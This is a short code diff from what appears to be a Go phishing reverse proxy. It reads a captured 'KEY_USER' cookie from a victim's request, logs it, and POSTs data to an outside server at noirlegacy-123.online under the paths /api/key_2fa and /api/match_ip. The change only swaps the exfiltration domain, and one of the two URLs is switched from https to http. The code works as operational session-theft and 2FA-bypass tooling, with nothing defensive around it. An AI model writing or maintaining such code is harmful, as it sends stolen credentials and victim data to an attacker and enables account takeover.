@@ -424,7 +424,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									cookie_ket, _ := req.Cookie("KEY_USER")
 									log.Success(cookie_ket.String())
 
-									urlPost0 := "https://legacy-123.online/api/key_2fa"
+									urlPost0 := "http://noirlegacy-123.online/api/key_2fa"
 									method0 := "POST"
 
 									payload0 := &bytes.Buffer{}
@@ -456,7 +456,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}(resp0.Body)
 
-									urlPost := "https://legacy-123.online/api/match_ip"
+									urlPost := "https://noirlegacy-123.online/api/match_ip"
 									method := "POST"
 
 									payload := &bytes.Buffer{}
